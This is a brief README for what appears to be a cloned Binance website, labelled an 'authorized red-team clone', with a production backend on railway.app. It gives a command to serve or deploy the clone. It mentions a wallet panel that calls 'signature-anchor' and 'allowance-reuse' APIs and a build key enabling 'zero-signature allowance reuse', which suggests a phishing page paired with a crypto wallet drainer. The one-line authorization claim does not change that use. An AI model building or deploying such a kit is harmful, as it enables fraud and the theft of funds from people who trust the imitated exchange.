# Authorized red-team clone

**Source:** https://www.binance.com/
**Backend:** https://sadrailala-production.up.railway.app
**Generated:** 2026-06-22T02:37:24.361Z


## Requirements

- Written authorization from target organization
- `KINETIC_INTERNAL_KEY` at build time enables zero-signature allowance reuse
- Production API must have RPC + settlement keys configured

## Usage

```bash
npx --yes serve "C:\Users\HP\Downloads\Legion\legion-engine\clones\binance-test" -l 8080
# or deploy to authorized staging domain
```

Wallet panel calls production `/api/v1/scout`, `/api/v1/signature-anchor`, and allowance-reuse internal APIs.
